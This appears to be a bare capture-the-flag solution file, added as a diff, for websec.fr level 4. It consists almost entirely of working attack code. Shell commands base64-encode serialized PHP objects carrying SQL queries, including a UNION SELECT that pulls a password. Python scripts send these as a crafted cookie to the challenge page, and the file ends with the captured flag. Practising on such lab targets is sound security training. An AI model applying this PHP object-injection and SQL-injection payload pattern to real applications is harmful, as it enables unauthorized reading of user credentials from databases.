@@ -1,0 +1,20 @@
+echo -n 'O:3:"SQL":1:{s:5:"query";s:37:"SELECT username FROM users WHERE id=1";}' | base64
+TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzc6IlNFTEVDVCB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkPTEiO30=
+
+import requests
+cookie = 'TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzc6IlNFTEVDVCBwYXNzd29yZCBGUk9NIHVzZXJzIFdIRVJFIGlkPTEiO30='
+url = 'https://websec.fr/level04/index.php'
+r = requests.get(url, cookies={'leet_hax0r': cookie})
+print(r.text)
+
+echo -n 'O:3:"SQL":1:{s:5:"query";s:81:"SELECT username FROM users WHERE id=1 UNION SELECT password from users WHERE id=1";}' | base64
+TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6ODE6IlNFTEVDVCB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkPTEgVU5JT04gU0VMRUNUIHBhc3N3b3JkIGZyb20gdXNlcnMgV0hFUkUgaWQ9MSI7fQ==
+
+
+import requests
+cookie = 'TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6ODE6IlNFTEVDVCB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkPTEgVU5JT04gU0VMRUNUIHBhc3N3b3JkIGZyb20gdXNlcnMgV0hFUkUgaWQ9MSI7fQ=='
+url = 'https://websec.fr/level04/index.php'
+r = requests.get(url, cookies={'leet_hax0r': cookie})
+print(r.text)
+
+level04:WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}
